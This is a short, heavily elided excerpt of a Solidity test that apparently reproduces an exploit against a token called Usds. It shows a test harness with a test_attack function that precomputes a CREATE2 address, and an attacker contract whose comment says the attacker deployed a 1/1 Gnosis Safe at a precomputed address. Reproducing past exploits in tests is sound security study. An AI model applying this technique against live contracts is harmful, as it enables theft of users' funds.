...
contract Exploit_Usds is TestHarness, TokenBalanceTracker {
    ...
    function test_attack() external {
        ...
        address precomputedAddr = factory.getAddress(factory.getBytecode(address(this)), uint256(9122018));
...
contract AttackerContract {
    ...
    // The attacker used a 1/1 Gnosis Safe and precomputed its address. The deployed it with a create2 dependant method.
